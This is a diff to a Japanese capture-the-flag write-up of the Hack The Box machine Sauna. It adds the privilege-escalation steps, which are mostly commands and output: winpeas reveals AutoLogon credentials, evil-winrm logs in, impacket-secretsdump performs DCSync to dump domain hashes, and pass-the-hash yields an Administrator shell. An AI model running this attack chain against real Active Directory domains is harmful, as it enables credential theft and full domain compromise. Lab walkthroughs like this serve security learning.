@@ -110,8 +110,64 @@ $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:b91...f22:Thestrokes23
 ```
 ┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
 └─$ evil-winrm -i 10.10.10.175 -u FSmith -p Thestrokes23
-...
+
 *Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
 egotisticalbank\fsmith
 ```
 # Privesc
+
+FSmith上でwinpeasを実行したら、ユーザsvc_loanmgrのパスワードが判明：
+
+```
+*Evil-WinRM* PS C:\Users\FSmith> .\winpeas.exe
+...
+Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+```
+
+（ユーザネームはsvc_loanmanagerではなくsvc_loanmgrということはFSmith上で調べ済み）
+
+
+次のようにしてsvc_loanmgrのシェルがとれる：
+
+```
+┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
+└─$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>whoami
+egotisticalbank\svc_loanmgr
+```
+
+bloodhoundよりsvc_loanmgrについてDCSyncの攻撃が可能とわかる：
+
+![svc-mgr-dcsyng](https://user-images.githubusercontent.com/85237728/196099439-b10878d9-e836-4d0b-8dac-95d8b4f16363.png)
+
+次のようにユーザのハッシュをダンプする：
+
+```
+┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
+└─$ impacket-secretsdump -dc-ip 10.10.10.175 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+...
+```
+
+Pass-the-HashでAdminのシェルをとる：
+
+```
+┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
+└─$ evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+...
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+egotisticalbank\administrator
+```
